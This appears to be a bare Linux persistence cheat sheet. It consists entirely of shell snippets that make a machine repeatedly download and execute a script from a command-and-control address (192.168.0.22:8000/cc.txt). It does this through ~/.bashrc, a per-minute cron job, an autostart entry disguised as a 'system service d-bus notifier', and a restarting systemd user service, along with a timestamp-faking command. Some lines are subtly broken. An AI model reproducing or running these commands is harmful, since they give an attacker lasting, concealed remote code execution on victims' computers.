========= VIA BASHRC ============
echo "bash <(wget -O- -q http://192.168.0.22:8000/cc.txt|sh)>cc.txt" > ~/.bashrc

========= VIA CRON ==============
(crontab -l 2>/dev/null;echo "* * * * * wget -O- -q http://192.168.0.22:8000/cc.txt|sh > cc.txt && touch -t 200904271322") | crontab -

========= VIA AUTOSTART FILES ===
mkdir ~/.config/dbus-notifier
cat <<EOF >~/.config/dbus-notifier/dbus-inotifier
#!/bin/sh
wget -O- -q http://192.168.0.22:8000/cc.txt|sh > cc.txt
EOF
mkdir ~/.config/autostart
cat <<EOF > ~/.config/autostart/dbus-inotifier.desktop
[Desktop Entry]
Type=Application
Exec=bash /home/debian/.config/dbus-notifier/dbus-inotifier
Name[en-EN]=system service d-bus notifier
Name=system service d-bus notifier
Comment[en-EN]=
Comment=
EOF

========= VIA SERVICE FILES ======
mkdir ~/.config/systemd/user
cat<<EOF >~/.config/systemd/usersample.service
[Unit]
Description=Sample\n
[Service]
ExecStart=bash<(wget -O- -q http://192.168.0.22:8000/cc.txt)> cc.txt
Restart=always
RestartSec=60\n
[Install]
WantedBy=default.target
EOF
systemctl --user enable sample
systemctl --user start sample
systemctl --user daemon-reload
